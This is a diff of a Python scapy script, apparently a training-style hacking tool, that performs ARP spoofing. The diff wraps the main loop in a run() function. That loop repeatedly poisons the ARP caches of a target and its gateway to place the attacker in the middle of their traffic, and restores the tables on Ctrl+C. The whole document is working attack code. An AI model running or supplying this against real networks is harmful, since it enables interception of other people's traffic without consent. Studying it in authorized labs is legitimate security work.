@@ -32,26 +32,27 @@ def restore(destination_ip, source_ip):
     packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
     scapy.send(packet, count = 4, verbose = False)
 
-args = get_arguments()
+def run():
+    args = get_arguments()
 
-target = args.target
-gateway = args.gateway
+    target = args.target
+    gateway = args.gateway
 
-sent_packets_count = 0
+    sent_packets_count = 0
 
-try:
-    while True:
-        #spoofing target
-        spoof(target, gateway)
-        #spoofing router
-        spoof(gateway, target)
-        sent_packets_count += 2
-        print("\r[+] Packets sent: " + str(sent_packets_count)),
-        # time.sleep(1)
-        # Python 3
-        #print("\r[+] Packets sent: " + str(sent_packets_count), end = "")
-except KeyboardInterrupt:
-    print("\n[+] Detected CTRL + C ......... Resetting ARP tables..... Please wait......")
-    restore(target, gateway)
-    restore(gateway, target)
+    try:
+        while True:
+            #spoofing target
+            spoof(target, gateway)
+            #spoofing router
+            spoof(gateway, target)
+            sent_packets_count += 2
+            print("\r[+] Packets sent: " + str(sent_packets_count)),
+            # time.sleep(1)
+            # Python 3
+            #print("\r[+] Packets sent: " + str(sent_packets_count), end = "")
+    except KeyboardInterrupt:
+        print("\n[+] Detected CTRL + C ......... Resetting ARP tables..... Please wait......")
+        restore(target, gateway)
+        restore(gateway, target)
     
